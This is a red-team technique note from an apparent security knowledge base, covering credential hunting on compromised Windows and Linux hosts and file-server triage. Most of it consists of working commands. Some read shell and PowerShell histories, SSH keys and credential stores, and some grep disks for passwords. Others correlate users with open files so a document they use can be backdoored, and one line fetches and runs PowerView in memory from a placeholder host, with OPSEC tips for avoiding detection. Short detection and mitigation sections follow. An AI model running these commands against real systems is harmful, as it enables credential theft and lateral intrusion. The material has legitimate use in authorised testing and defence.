---
title: Credential Hunting
aliases: ["Credential hunting", "PowerShell history creds", "Find passwords on disk", "File server triage"]
type: technique
domain: [red-team]
attack_tactic: [credential-access]
tags: [type/technique, domain/red-team, attack/credential-access]
source: ["[[Source - zer1t0 - Attacking Active Directory]]", "[[Source - harmj0y blog]]"]
source_url: "https://zer1t0.gitlab.io/posts/attacking_ad/"
verified: true
related: ["[[Credential Storage in Windows]]", "[[Linux in AD]]", "[[AD User Object]]", "[[PowerView]]", "[[User Hunting]]"]
created: 2026-06-06
updated: 2026-06-07
---

# Credential Hunting

> [!summary] One-liner
> After landing on a host, search the filesystem and user profiles for plaintext or reusable credentials beyond the credential stores.

## Concept abused
Users and apps leave secrets in histories, config files, and key stores — outside [[Credential Storage in Windows|LSASS/SAM/LSA]].

## Windows locations
| Location | What's there |
|---|---|
| `%APPDATA%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` | **PowerShell history** — pwds typed inline |
| `C:\Users\<u>\AppData\Local\Microsoft\Credentials\` | **Credential Manager** vault (DPAPI) |
| Browser DBs (Chrome/Edge/Firefox) | Saved passwords (DPAPI-protected) |
| `C:\Users\<u>\.ssh\` | SSH private keys |
| `...\Terminal Server Client\` | RDP connection history |
| App config files, scheduled-task creds, VPN/cloud configs | Embedded/cached creds |

```powershell
# quick grep for secrets
Get-Content $env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
findstr /SIM /C:"password" C:\Users\*  2>nul
```

## Linux locations
| Location | What's there |
|---|---|
| `~/.bash_history` | Shell history (pwds, hosts) — persists after `history -c` |
| `~/.bashrc`, `~/.profile` | Hardcoded creds / exports |
| `~/.ssh/` (`id_rsa`, `id_ed25519`, `authorized_keys`) | SSH keys |
| `env`, shell startup files | Exported credential vars |
| `/etc/sudoers`, cron (`crontab`) | Referenced/plaintext creds |
| `/var/log/`, `/tmp`, `/var/tmp` | Logs / temp files with secrets |

```bash
cat ~/.bash_history; env; ls -la ~/.ssh
grep -RinE 'password|passwd|secret|api[_-]?key' /home /etc /var/www 2>/dev/null
```

## More from harmj0y (file server triage)
Beyond single-host profile hunting, **file servers** are a high-value credential-hunting target — but a server with millions of files makes triage incredibly time consuming. The approach below builds a structured inventory (filename, owner, access/write times, size) so you can prioritize what to read or backdoor instead of grepping blindly.

### Building a file inventory
Plain directory listing, then a metadata-rich listing sorted by most-recently-accessed (`/O:-D`), with last-access time (`/T:A`) and owner (`/Q`):

```cmd
:: simple recursive listing
dir /s C:\ > listing.txt

:: sorted by most-recently-accessed, include owner + access time
dir /S /Q /O:-D /T:A C:\ > listing.txt
```

PowerShell version that exports a CSV with FullName, **Owner** (via `Get-Acl`), LastAccessTime, LastWriteTime and Length — note output can reach gigabytes in large environments:

```powershell
# all files -> CSV with owner + timestamps
powershell.exe -command "get-childitem .\ -rec -ErrorAction SilentlyContinue | where {!$_.PSIsContainer} | select-object FullName, @{Name='Owner';Expression={(Get-Acl $_.FullName).Owner}}, LastAccessTime, LastWriteTime, Length | export-csv -notypeinformation -path files.csv"
```

### Filtering by extension or keyword filename
The `-include` parameter matches **file names only**, NOT file contents:

```powershell
# common document types
powershell.exe -command "get-childitem .\ -rec -ErrorAction SilentlyContinue -include @('*.doc*','*.xls*','*.pdf')|where{!$_.PSIsContainer}|select-object FullName,@{Name='Owner';Expression={(Get-Acl $_.FullName).Owner}},LastAccessTime,LastWriteTime,Length|export-csv -notypeinformation -path files.csv"

# keyword filename wildcards
powershell.exe -command "get-childitem .\ -rec -ErrorAction SilentlyContinue -include @('*password*','*sensitive*','*secret*')|where{!$_.PSIsContainer}|select-object FullName,@{Name='Owner';Expression={(Get-Acl $_.FullName).Owner}},LastAccessTime,LastWriteTime,Length|export-csv -notypeinformation -path files.csv"
```

Recommended keyword wildcards: `*password*`, `*sensitive*`, `*secret*`. Common high-value extensions: `.doc*`, `.xls*`, `.pdf`.

### Correlating open files to users (targeted backdooring)
[[PowerView]] (Veil-PowerView) wraps the `NetFileEnum` / `NetSessionEnum` APIs. `Get-NetFiles` lists currently-open files on a server; `Get-NetSessions` maps a username to the computer they connected from. Joining them lets you see which file a specific user has open and from where — useful for [[User Hunting|targeting a specific user]] by backdooring a document they actively touch.

```powershell
# join open files (Get-NetFiles) with sessions (Get-NetSessions) -> CSV
powershell.exe -exec bypass -Command "& {Import-Module .\powerview.ps1; $sess=@{};Get-Netsessions|foreach{$sess[$_.sesi10_username]=$_.sesi10_cname};Get-NetFiles | Select-Object @{Name='Username';Expression={$_.fi3_username}},@{Name='Filepath';Expression={$_.fi3_pathname}},@{Name='Computer';Expression={$sess[$_.fi3_username]}}|export-csv -notypeinformation -path open_files.csv}"
```

```powershell
# disk-less variant: download PowerView in memory, print to console
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<HOST>/powerview.ps1'); $sess=@{};Get-Netsessions|foreach{$sess[$_.sesi10_username]=$_.sesi10_cname};Get-NetFiles | Select-Object @{Name='Username';Expression={$_.fi3_username}},@{Name='Filepath';Expression={$_.fi3_pathname}},@{Name='Computer';Expression={$sess[$_.fi3_username]}}"
```

> [!note] OPSEC
> Sorting by `LastAccessTime` surfaces recently-touched sensitive data; the in-memory `IEX (...).DownloadString(...)` variant avoids dropping PowerView to disk. File-ownership data narrows targeting so you read/backdoor fewer files (lower noise).

## Detection / artifacts
File reads are low-signal; mass `grep`/`findstr` and access to key stores may trip EDR/file-audit. Recursive `dir /s` / `Get-ChildItem -rec` across a whole volume and bulk `Get-Acl` lookups generate large-scale file-access patterns; `NetSessionEnum`/`NetFileEnum` queries and on-the-fly `DownloadString` IEX execution are additional indicators.

## Mitigation
Secrets managers (no plaintext on disk), DPAPI/credential-vault hygiene, restrict history retention, key passphrases. On file servers: avoid storing credential-bearing documents (filenames like `*password*`), enforce least-privilege share/NTFS ACLs, and audit/restrict session and file enumeration.

## Related
- Memory/registry stores: [[Credential Storage in Windows]]; Linux Kerberos creds: [[Linux in AD]].
- Session/file enumeration tooling: [[PowerView]]; targeting users via open files: [[User Hunting]].

## Sources
- [[Source - zer1t0 - Attacking Active Directory]] — "Powershell history" / "Other places to find credentials in Windows/Linux"
- [[Source - harmj0y blog]] — "File Server Triage on Red Team Engagements" — https://blog.harmj0y.net/redteaming/file-server-triage-on-red-team-engagements/
